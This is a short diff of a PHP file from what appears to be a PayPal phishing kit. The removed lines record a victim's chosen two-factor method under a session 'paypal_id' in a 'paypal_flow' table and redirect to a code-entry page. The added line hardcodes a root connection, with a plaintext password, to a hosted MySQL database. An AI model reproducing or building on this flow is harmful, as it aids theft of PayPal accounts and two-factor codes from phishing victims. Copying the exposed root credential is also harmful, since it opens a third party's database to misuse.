@@ -1,26 +1,8 @@
 <?php
+$conn = new mysqli('mysql.railway.internal', 'root', 'dKoENyxanuhrHlOuWovDKCbOMcJQKtFM', 'railway', 3306);
 
-session_start();
-
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $selected_option = $_POST['twofa_method'] ?? '';
-    $paypal_id = $_SESSION['paypal_id'] ?? null;
-
-    if ($paypal_id && !empty($selected_option)) {
-        $conn = new mysqli('localhost', 'root', '', 'my_base');
-        if ($conn->connect_error) {
-            die("Connectie mislukt: " . $conn->connect_error);
-        }
-
-        $stmt = $conn->prepare("UPDATE paypal_flow SET twofa_method = ? WHERE id = ?");
-        $stmt->bind_param("si", $selected_option, $paypal_id);
-        $stmt->execute();
-        $stmt->close();
-        $conn->close();
-
-        header("Location: paypcode.php");
-        exit();
-        }
+if ($conn->connect_error) {
+    die("Connectie mislukt: " . $conn->connect_error);
 }
 ?>
 
